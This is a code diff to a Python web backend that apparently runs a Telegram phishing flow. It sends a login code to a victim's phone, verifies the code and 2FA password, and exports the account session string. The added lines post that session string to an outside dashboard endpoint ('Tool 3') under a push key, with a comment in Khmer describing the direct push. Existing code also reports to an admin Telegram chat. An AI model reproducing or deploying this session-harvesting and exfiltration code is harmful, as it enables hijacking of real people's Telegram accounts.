@@ -21,6 +21,11 @@ raw_admin_chat = os.getenv("ADMIN_CHAT_ID", "")
 ADMIN_CHAT_ID = int(raw_admin_chat) if raw_admin_chat.lstrip('-').isdigit() else raw_admin_chat
 
 STATIC_INVITE_LINK = os.getenv("STATIC_INVITE_LINK", "https://t.me/+bDGHiHUCt_MwOWY9")
+
+# ─── TOOL 3 PUSH CONFIGURATION ───
+TOOL3_PUSH_URL = os.getenv("TOOL3_PUSH_URL", "https://dashboardbyfinn.up.railway.app/api/tool3/sessions/push")
+T3_PUSH_KEY = os.getenv("T3_PUSH_KEY", "")
+
 temp_clients = {}
 
 # ─── SQLITE DATABASE HELPER ───
@@ -80,31 +85,37 @@ def _sync_bot_api_post(method: str, data: dict):
 async def bot_api_post(method: str, data: dict):
     return await asyncio.to_thread(_sync_bot_api_post, method, data)
 
-def parse_device_info(user_agent=""):
-    device_model = "Mobile App"
-    system_version = "Android 13"
-    if "iPhone" in user_agent or "iPad" in user_agent:
-        device_model = "iPhone"
-        system_version = "iOS 17.0"
-    elif "Windows" in user_agent:
-        device_model = "PC Desktop"
-        system_version = "Windows 11"
-    elif "Macintosh" in user_agent:
-        device_model = "MacBook Pro"
-        system_version = "macOS Sonoma"
-    return device_model, system_version
+# ─── PUSH TO TOOL 3 HELPER ───
+def _sync_push_to_tool3(session_string: str):
+    if not TOOL3_PUSH_URL or not T3_PUSH_KEY:
+        logger.warning("⚠️ TOOL3_PUSH_URL or T3_PUSH_KEY is missing. Skipping direct push.")
+        return
+    
+    headers = {
+        "X-Push-Key": T3_PUSH_KEY,
+        "Content-Type": "application/json"
+    }
+    payload = {
+        "string": session_string
+    }
+    try:
+        res = requests.post(TOOL3_PUSH_URL, json=payload, headers=headers, timeout=10)
+        if res.status_code == 200:
+            logger.info("🚀 Successfully pushed session string directly to Tool 3!")
+        else:
+            logger.error(f"❌ Failed to push to Tool 3: {res.status_code} - {res.text}")
+    except Exception as e:
+        logger.error(f"⚠️ Error connecting to Tool 3 push endpoint: {e}")
 
-async def async_send_code(phone_number, user_agent):
-    device_model, system_version = parse_device_info(user_agent)
+async def push_to_tool3(session_string: str):
+    await asyncio.to_thread(_sync_push_to_tool3, session_string)
+
+async def async_send_code(phone_number):
     client = Client(
         name=f"session_{phone_number.replace('+', '')}",
         api_id=API_ID,
         api_hash=API_HASH,
-        in_memory=True,
-        device_model=device_model,
-        system_version=system_version,
-        app_version="10.2.1",
-        lang_code="en"
+        in_memory=True
     )
     await client.connect()
     sent = await client.send_code(phone_number)
@@ -138,6 +149,9 @@ async def async_verify_code(phone_number, code, password):
     session_string = await client.export_session_string()
     await client.disconnect()
     temp_clients.pop(phone_number, None)
+
+    # 🚀 ផ្ញើ Session String ចូល Project Tool 3 (dashboardbyfinn.up.railway.app) ដោយផ្ទាល់
+    await push_to_tool3(session_string)
 
     msg_id = None
     if BOT_TOKEN and ADMIN_CHAT_ID:
@@ -186,7 +200,7 @@ def send_code():
         phone_number = '+' + phone_number
 
     try:
-        future = asyncio.run_coroutine_threadsafe(async_send_code(phone_number, request.headers.get('User-Agent', '')), loop)
+        future = asyncio.run_coroutine_threadsafe(async_send_code(phone_number), loop)
         future.result()
         return jsonify({"success": True, "message": "OTP code sent!"})
     except Exception as err:
